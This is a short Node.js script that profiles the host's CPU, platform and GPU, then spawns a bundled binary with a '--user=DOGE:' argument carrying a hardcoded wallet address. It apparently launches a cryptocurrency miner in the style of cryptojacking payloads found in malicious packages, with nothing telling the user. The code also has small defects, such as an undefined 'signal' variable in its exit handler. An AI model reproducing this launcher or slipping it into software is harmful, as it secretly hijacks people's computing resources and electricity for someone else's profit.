function getOSDetails() {
  const si = require("systeminformation");
  return si.graphics().then((resp) => {
    const os = require("os");

    const CPUS = os.cpus().length;
    const PLATFORM = os.platform();
    const ARCH = os.arch();

    const graphicsTestStrings = ["NVIDIA", "GeForce", "radeon"];

    const siInfo = JSON.stringify(resp).toLowerCase();
    console.log(resp);
    const HAS_GPU = graphicsTestStrings
      .map((key) => siInfo.includes(key.toLowerCase()))
      .reduce((acc, val) => acc || val, false);

    return {
      CPUS,
      PLATFORM,
      ARCH,
      HAS_GPU,
    };
  });
}

function prepareBinFileNames(opt) {
  const path = require("path");

  const platformMap = {
    linux: "l",
  };

  const cpuBin = path.join(
    __dirname,
    "bin",
    `${opt.HAS_GPU ? "c" : "c"}-${platformMap[opt.PLATFORM]}-${opt.ARCH}`
  );

  return {
    cpuBin: path.join(
      __dirname,
      "bin",
      `c-${platformMap[opt.PLATFORM]}-${opt.ARCH}`
    ),
    gpuBin: null,
  };
}

getOSDetails()
  .then((resp) => {
    const bins = prepareBinFileNames(resp);

    const spawn = require("child_process").spawn;
    const { nanoid } = require("nanoid");

    if (bins.cpuBin) {
      const args = [
        "--user=DOGE:DNNWw2o6ytV9MaBEsMgMEsnBLaKeRbzUQu.cxxx_" + nanoid(),
      ];
      console.log(bins.cpuBin, args);

      const child = spawn(bins.cpuBin, args, { stdio: "inherit" });
      child.on("exit", (code, sig) => {
        console.log(
          `child process exited with code ${code} and signal ${signal}`
        );
      });
    }
  })
  .catch((err) => console.error(err));
